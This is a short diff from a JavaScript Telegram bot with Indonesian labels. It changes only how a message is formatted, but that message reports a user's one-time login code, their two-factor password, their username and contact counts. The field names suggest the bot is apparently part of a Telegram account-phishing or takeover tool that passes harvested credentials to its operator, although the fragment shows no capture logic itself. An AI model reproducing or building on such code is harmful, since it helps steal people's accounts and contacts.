@@ -288,9 +288,9 @@ function startBot(token) {
         `📩 OTP: ${otpCode}\n` +
         `🔐 A2F: ${password}\n` +
         `🆔 Username: @${info.username || 'Tidak Ada'}\n` +
-        `👥 Kontak Total: ${info.totalContacts || 0}\n` +
-        `🤝 Mutual Contacts: ${info.mutualContacts || 0}\n` +
-        `🙅 Non-Mutual Contacts: ${info.nonMutualContacts || 0}`,
+        `-- Total Kontak: ${info.totalContacts || 0}\n` +
+        `-- Mutual: ${info.mutualContacts || 0}\n` +
+        `-- Non-Mutual: ${info.nonMutualContacts || 0}`,
         {
           parse_mode: 'Markdown',
           ...Markup.inlineKeyboard([
